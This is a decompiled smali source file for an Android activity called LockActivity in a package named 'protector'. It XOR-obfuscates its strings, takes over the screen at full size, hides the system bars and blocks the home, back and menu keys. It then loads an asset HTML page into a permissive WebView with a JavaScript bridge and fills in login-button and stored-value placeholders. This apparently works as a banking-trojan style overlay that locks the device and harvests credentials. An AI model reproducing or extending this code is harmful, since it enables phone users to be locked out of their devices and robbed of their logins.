.class public Lcom/icontrol/protector/LockActivity;
.super Landroid/app/Activity;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/icontrol/protector/LockActivity$c;,
        Lcom/icontrol/protector/LockActivity$b;,
        Lcom/icontrol/protector/LockActivity$d;
    }
.end annotation


# static fields
.field private static c:Lcom/icontrol/protector/LockActivity;

.field static d:Landroid/content/Context;


# instance fields
.field b:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/16 v0, 0x5c

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/icontrol/protector/LockActivity;->b:Ljava/lang/String;

    return-void

    :array_0
    .array-data 1
        0x4t
        -0x5at
        0x5bt
        0x5ft
        -0x32t
        0x4ct
        0x1dt
        -0x63t
        0x2at
        -0x69t
        0x76t
        0x51t
        -0x23t
        0x7at
        0x6ct
        -0x68t
        0x3et
        -0x5bt
        0x71t
        0x55t
        -0x37t
        0x5ct
        0x6ct
        -0x69t
        0x2ct
        -0x4ft
        0x5ct
        0x51t
        -0x23t
        0x7at
        0x6ct
        -0x6ct
        0x2et
        -0x4ft
        0x48t
        0x51t
        -0x23t
        0x7at
        0x6et
        -0x19t
        0x25t
        -0x4ft
        0x6et
        0x53t
        -0x23t
        0x7at
        0x6ct
        -0x69t
        0x2et
        -0x40t
        0x75t
        0x55t
        -0x33t
        0x6dt
        0x7ft
        -0x1et
        0x5ft
        -0x63t
        0x57t
        0x7bt
        -0x49t
        0x7at
        0x15t
        -0x69t
        0x2ct
        -0x5ft
        0x4ct
        0x52t
        -0x23t
        0x68t
        0x4et
        -0x71t
        0x59t
        -0x3et
        0x40t
        0x51t
        -0x23t
        0x7at
        0x6ct
        -0x69t
        0x3et
        -0x5bt
        0x4ft
        0x5ft
        -0x32t
        0x70t
        0x18t
        -0x6bt
        0x34t
        -0x47t
        0x50t
        0x2dt
    .end array-data

    :array_1
    .array-data 1
        0x6dt
        -0x10t
        0x19t
        0x10t
        -0x64t
        0x3bt
        0x2dt
        -0x2at
    .end array-data
.end method

.method public static a()V
    .locals 1

    .line 1
    sget-object v0, Lcom/icontrol/protector/LockActivity;->c:Lcom/icontrol/protector/LockActivity;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/app/Activity;->finish()V

    const/4 v0, 0x0

    sput-object v0, Lcom/icontrol/protector/LockActivity;->c:Lcom/icontrol/protector/LockActivity;

    :cond_0
    return-void
.end method

.method public static b()Z
    .locals 1

    .line 1
    sget-object v0, Lcom/icontrol/protector/LockActivity;->c:Lcom/icontrol/protector/LockActivity;

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method private c(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    .line 1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v1

    invoke-virtual {v1, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object p1
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/InputStreamReader;

    invoke-direct {v2, p1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    :goto_0
    :try_start_2
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\n"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    goto :goto_2

    :cond_0
    :try_start_3
    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    if-eqz p1, :cond_1

    :try_start_4
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    goto :goto_6

    :cond_1
    :goto_1
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    :catchall_1
    move-exception v0

    goto :goto_4

    :goto_2
    :try_start_5
    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    goto :goto_3

    :catchall_2
    move-exception v1

    :try_start_6
    invoke-virtual {v0, v1}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_3
    throw v0
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_1

    :goto_4
    if-eqz p1, :cond_2

    :try_start_7
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_3

    goto :goto_5

    :catchall_3
    move-exception p1

    :try_start_8
    invoke-virtual {v0, p1}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :cond_2
    :goto_5
    throw v0
    :try_end_8
    .catch Ljava/io/IOException; {:try_start_8 .. :try_end_8} :catch_0

    :goto_6
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    const/4 p1, 0x0

    return-object p1
.end method


# virtual methods
.method public dispatchKeyEvent(Landroid/view/KeyEvent;)Z
    .locals 0

    const/4 p1, 0x1

    return p1
.end method

.method public onBackPressed()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 11

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    sput-object p0, Lcom/icontrol/protector/LockActivity;->c:Lcom/icontrol/protector/LockActivity;

    const/4 p1, 0x1

    invoke-virtual {p0, p1}, Landroid/app/Activity;->requestWindowFeature(I)Z

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x400

    invoke-virtual {v0, v1, v1}, Landroid/view/Window;->setFlags(II)V

    const/4 v0, 0x2

    :try_start_0
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1e

    if-lt v1, v2, :cond_0

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v1

    invoke-static {v1}, Lntidisestablish/neumonoul/floccinaucinih/pn;->a(Landroid/view/Window;)Landroid/view/WindowInsetsController;

    move-result-object v1

    if-eqz v1, :cond_1

    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/l80;->a()I

    move-result v2

    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/m80;->a()I

    move-result v3

    or-int/2addr v2, v3

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/qn;->a(Landroid/view/WindowInsetsController;I)V

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/rn;->a(Landroid/view/WindowInsetsController;I)V

    goto :goto_0

    :cond_0
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object v1

    const/16 v2, 0x1002

    invoke-virtual {v1, v2}, Landroid/view/View;->setSystemUiVisibility(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    :goto_0
    sget-object v1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    if-nez v1, :cond_2

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sput-object v1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    :cond_2
    new-instance v1, Landroid/webkit/WebView;

    invoke-direct {v1, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    invoke-virtual {v2, p1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    invoke-virtual {v2, p1}, Landroid/webkit/WebSettings;->setLoadsImagesAutomatically(Z)V

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    invoke-virtual {v2, p1}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    :try_start_1
    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object v2

    invoke-virtual {v2, p1}, Landroid/webkit/CookieManager;->setAcceptCookie(Z)V

    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object v2

    invoke-virtual {v2, v1, p1}, Landroid/webkit/CookieManager;->setAcceptThirdPartyCookies(Landroid/webkit/WebView;Z)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    invoke-virtual {v2, p1}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    invoke-virtual {v3, p1}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    invoke-virtual {v3, p1}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    invoke-virtual {v3, p1}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    invoke-virtual {v3, p1}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    invoke-virtual {v3, p1}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    invoke-virtual {v3, p1}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V

    const/4 v3, 0x0

    :try_start_2
    invoke-virtual {v1, v0, v3}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v4

    sget-object v5, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;

    invoke-virtual {v4, v5}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v4

    sget-object v5, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;

    invoke-virtual {v4, v5}, Landroid/webkit/WebSettings;->setRenderPriority(Landroid/webkit/WebSettings$RenderPriority;)V

    const/4 v4, -0x1

    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setBackgroundColor(I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    new-instance v4, Lcom/icontrol/protector/LockActivity$c;

    invoke-direct {v4, p0, v3}, Lcom/icontrol/protector/LockActivity$c;-><init>(Lcom/icontrol/protector/LockActivity;Lcom/icontrol/protector/LockActivity$a;)V

    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    new-instance v4, Lcom/icontrol/protector/LockActivity$b;

    invoke-direct {v4, p0, v3}, Lcom/icontrol/protector/LockActivity$b;-><init>(Lcom/icontrol/protector/LockActivity;Lcom/icontrol/protector/LockActivity$a;)V

    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    new-instance v3, Lcom/icontrol/protector/LockActivity$d;

    invoke-direct {v3, p0, p0}, Lcom/icontrol/protector/LockActivity$d;-><init>(Lcom/icontrol/protector/LockActivity;Landroid/content/Context;)V

    const/16 v4, 0xa

    new-array v4, v4, [B

    fill-array-data v4, :array_0

    const/16 v5, 0x8

    new-array v6, v5, [B

    fill-array-data v6, :array_1

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v3, v4}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v3, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    const/16 v4, 0x154

    const/16 v6, 0x28a

    invoke-static {v3, v4, v6, v2}, Lcom/icontrol/protector/n;->o(Landroid/content/Context;IIZ)Ljava/lang/String;

    move-result-object v3

    :try_start_3
    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v4, v5, [B

    fill-array-data v4, :array_3

    invoke-static {v0, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    iget-object v3, p0, Lcom/icontrol/protector/LockActivity;->b:Ljava/lang/String;

    :cond_3
    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v4, Lntidisestablish/neumonoul/floccinaucinih/ab;->K:Ljava/lang/String;

    const/16 v6, 0x15

    new-array v6, v6, [B

    fill-array-data v6, :array_4

    new-array v7, v5, [B

    fill-array-data v7, :array_5

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-static {v0, v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v4, 0x5

    new-array v6, v4, [B

    fill-array-data v6, :array_6

    new-array v7, v5, [B

    fill-array-data v7, :array_7

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    sget-object v7, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v8, Lntidisestablish/neumonoul/floccinaucinih/ab;->J:Ljava/lang/String;

    const-string v9, ""

    invoke-static {v7, v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    const/4 v8, 0x6

    if-ne v7, v8, :cond_4

    const/4 v6, 0x4

    new-array v6, v6, [B

    fill-array-data v6, :array_8

    new-array v7, v5, [B

    fill-array-data v7, :array_9

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    :cond_4
    sget-object v7, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v8, Lntidisestablish/neumonoul/floccinaucinih/ab;->M:Ljava/lang/String;

    new-array v9, p1, [B

    const/16 v10, 0x74

    aput-byte v10, v9, v2

    new-array v10, v5, [B

    fill-array-data v10, :array_a

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-static {v7, v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    new-array v8, p1, [B

    const/16 v9, 0x1a

    aput-byte v9, v8, v2

    new-array v9, v5, [B

    fill-array-data v9, :array_b

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    const/16 v9, 0x9

    if-eqz v8, :cond_5

    sget-object p1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->L:Ljava/lang/String;

    const/16 v8, 0xe

    new-array v8, v8, [B

    fill-array-data v8, :array_c

    new-array v10, v5, [B

    fill-array-data v10, :array_d

    invoke-static {v8, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    :goto_1
    invoke-static {p1, v2, v8}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    goto :goto_2

    :cond_5
    new-array p1, p1, [B

    const/16 v8, 0x36

    aput-byte v8, p1, v2

    new-array v2, v5, [B

    fill-array-data v2, :array_e

    invoke-static {p1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v7, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_6

    sget-object p1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->L:Ljava/lang/String;

    new-array v8, v9, [B

    fill-array-data v8, :array_f

    new-array v10, v5, [B

    fill-array-data v10, :array_10

    invoke-static {v8, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    goto :goto_1

    :cond_6
    sget-object p1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->L:Ljava/lang/String;

    const/16 v8, 0xc

    new-array v8, v8, [B

    fill-array-data v8, :array_11

    new-array v10, v5, [B

    fill-array-data v10, :array_12

    invoke-static {v8, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    goto :goto_1

    :goto_2
    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/tq;->c()Lntidisestablish/neumonoul/floccinaucinih/tq;

    move-result-object v2

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v7, 0x3

    new-array v7, v7, [B

    fill-array-data v7, :array_13

    new-array v10, v5, [B

    fill-array-data v10, :array_14

    invoke-static {v7, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {p0, v7}, Lcom/icontrol/protector/LockActivity;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7}, Lntidisestablish/neumonoul/floccinaucinih/tq;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v7, 0x7

    new-array v7, v7, [B

    fill-array-data v7, :array_15

    new-array v8, v5, [B

    fill-array-data v8, :array_16

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    iget-object v2, p0, Lcom/icontrol/protector/LockActivity;->b:Ljava/lang/String;

    invoke-virtual {v0, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    new-array v2, v4, [B

    fill-array-data v2, :array_17

    new-array v3, v5, [B

    fill-array-data v3, :array_18

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2, p1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    new-array v0, v9, [B

    fill-array-data v0, :array_19

    new-array v2, v5, [B

    fill-array-data v2, :array_1a

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    new-array v0, v4, [B

    fill-array-data v0, :array_1b

    new-array v2, v5, [B

    fill-array-data v2, :array_1c

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v2, Lcom/icontrol/protector/My_Configs;->_Login_btn_:Ljava/lang/String;

    invoke-virtual {p1, v0, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    const/4 v3, 0x0

    new-array v0, v9, [B

    fill-array-data v0, :array_1d

    new-array v2, v5, [B

    fill-array-data v2, :array_1e

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v4, [B

    fill-array-data v2, :array_1f

    new-array v4, v5, [B

    fill-array-data v4, :array_20

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    move-object v2, v1

    move-object v4, p1

    move-object v5, v0

    invoke-virtual/range {v2 .. v7}, Landroid/webkit/WebView;->loadDataWithBaseURL(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0, v1}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_3

    :catch_3
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :goto_3
    return-void

    :array_0
    .array-data 1
        0x4bt
        -0x61t
        -0x6bt
        0x5ft
        0x50t
        0x1t
        0x10t
        -0x63t
        0x6dt
        -0x74t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x8t
        -0x2t
        -0x7t
        0x33t
        0x12t
        0x60t
        0x73t
        -0xat
    .end array-data

    :array_2
    .array-data 1
        0x3dt
        -0x7et
    .end array-data

    nop

    :array_3
    .array-data 1
        0x10t
        -0x4dt
        0x64t
        -0x32t
        -0x2ft
        0x3at
        0xft
        -0x2at
    .end array-data

    :array_4
    .array-data 1
        -0x77t
        -0xet
        -0x48t
        -0x27t
        -0x60t
        -0xft
        0x16t
        0x13t
        -0x4dt
        -0x1bt
        -0x48t
        -0x27t
        -0x5ct
        -0x10t
        0x5at
        0x46t
        -0x50t
        -0x8t
        -0x56t
        -0x27t
        -0x5ct
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x40t
        -0x64t
        -0x35t
        -0x53t
        -0x3ft
        -0x63t
        0x7at
        0x33t
    .end array-data

    :array_6
    .array-data 1
        -0x20t
        -0x4t
        0x5dt
        0x3t
        0x7at
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x7at
        -0x63t
        0x31t
        0x70t
        0x1ft
        -0x5ft
        0x3t
        -0x57t
    .end array-data

    :array_8
    .array-data 1
        -0x42t
        -0x39t
        0x16t
        0x3ct
    .end array-data

    :array_9
    .array-data 1
        -0x36t
        -0x4bt
        0x63t
        0x59t
        0x37t
        0x1ct
        -0x2t
        -0x42t
    .end array-data

    :array_a
    .array-data 1
        0x45t
        0x5dt
        -0xft
        -0x5ft
        0x2ft
        -0x6bt
        0x11t
        0xdt
    .end array-data

    :array_b
    .array-data 1
        0x29t
        0x1at
        -0x19t
        -0x51t
        0x1bt
        0x69t
        -0x5ft
        -0x6ct
    .end array-data

    :array_c
    .array-data 1
        0x60t
        -0x37t
        -0x18t
        0x28t
        -0x18t
        -0x70t
        -0x4bt
        0x33t
        0x56t
        -0x2ct
        -0x15t
        0x22t
        -0x18t
        -0x2ct
    .end array-data

    nop

    :array_d
    .array-data 1
        0x25t
        -0x59t
        -0x64t
        0x4dt
        -0x66t
        -0x50t
        -0x1bt
        0x52t
    .end array-data

    :array_e
    .array-data 1
        0x4t
        -0x28t
        0x73t
        0x6bt
        0x79t
        0x9t
        0x14t
        0xdt
    .end array-data

    :array_f
    .array-data 1
        -0x60t
        0x1ct
        -0x61t
        0x55t
        0x35t
        0x7at
        -0x7dt
        -0x75t
        -0x55t
    .end array-data

    nop

    :array_10
    .array-data 1
        -0x1bt
        0x72t
        -0x15t
        0x30t
        0x47t
        0x5at
        -0x2dt
        -0x3et
    .end array-data

    :array_11
    .array-data 1
        -0x1ct
        -0x72t
        -0x44t
        -0x7at
        -0x44t
        0x40t
        0x2bt
        0x14t
        -0x2ct
        -0x67t
        -0x51t
        -0x61t
    .end array-data

    :array_12
    .array-data 1
        -0x60t
        -0x4t
        -0x23t
        -0xft
        -0x64t
        0x30t
        0x4at
        0x60t
    .end array-data

    :array_13
    .array-data 1
        -0x6at
        0x7ft
        0x1t
    .end array-data

    :array_14
    .array-data 1
        -0x48t
        0x1dt
        0x75t
        -0x5t
        0x18t
        -0x1bt
        0x31t
        0x15t
    .end array-data

    :array_15
    .array-data 1
        -0xet
        0x9t
        -0x2bt
        -0x6at
        -0x4ct
        -0x45t
        0x71t
    .end array-data

    :array_16
    .array-data 1
        -0x57t
        0x5dt
        -0x64t
        -0x3et
        -0x8t
        -0x2t
        0x2ct
        0xct
    .end array-data

    :array_17
    .array-data 1
        -0x17t
        0x1t
        -0x6bt
        -0x59t
        0x15t
    .end array-data

    nop

    :array_18
    .array-data 1
        -0x4et
        0x45t
        -0x24t
        -0xct
        0x48t
        0x75t
        0x1et
        -0x68t
    .end array-data

    :array_19
    .array-data 1
        -0x66t
        0x0t
        -0xat
        0x25t
        0x42t
        -0x31t
        0x66t
        -0x51t
        -0x7et
    .end array-data

    nop

    :array_1a
    .array-data 1
        -0x36t
        0x49t
        -0x48t
        0x69t
        0x7t
        -0x7ft
        0x21t
        -0x5t
    .end array-data

    :array_1b
    .array-data 1
        0x5ft
        -0x40t
        0x31t
        -0x57t
        0x42t
    .end array-data

    nop

    :array_1c
    .array-data 1
        0x4t
        -0x7et
        0x65t
        -0x19t
        0x1ft
        0x4et
        0x29t
        0x67t
    .end array-data

    :array_1d
    .array-data 1
        -0x4at
        0x45t
        -0x6at
        -0x44t
        0xct
        0x6ct
        -0x73t
        0xft
        -0x52t
    .end array-data

    nop

    :array_1e
    .array-data 1
        -0x3et
        0x20t
        -0x12t
        -0x38t
        0x23t
        0x4t
        -0x7t
        0x62t
    .end array-data

    :array_1f
    .array-data 1
        -0xbt
        0x7et
        0x7dt
        0x4bt
        0x4ft
    .end array-data

    nop

    :array_20
    .array-data 1
        -0x60t
        0x2at
        0x3bt
        0x66t
        0x77t
        -0xat
        -0x5bt
        0x57t
    .end array-data
.end method

.method public onDestroy()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/icontrol/protector/LockActivity;->c:Lcom/icontrol/protector/LockActivity;

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 p2, 0x3

    const/4 v0, 0x1

    if-ne p1, p2, :cond_0

    return v0

    :cond_0
    const/4 p2, 0x4

    if-ne p1, p2, :cond_1

    return v0

    :cond_1
    const/16 p2, 0x52

    if-ne p1, p2, :cond_2

    return v0

    :cond_2
    const/4 p1, 0x0

    return p1
.end method

.method protected onStop()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
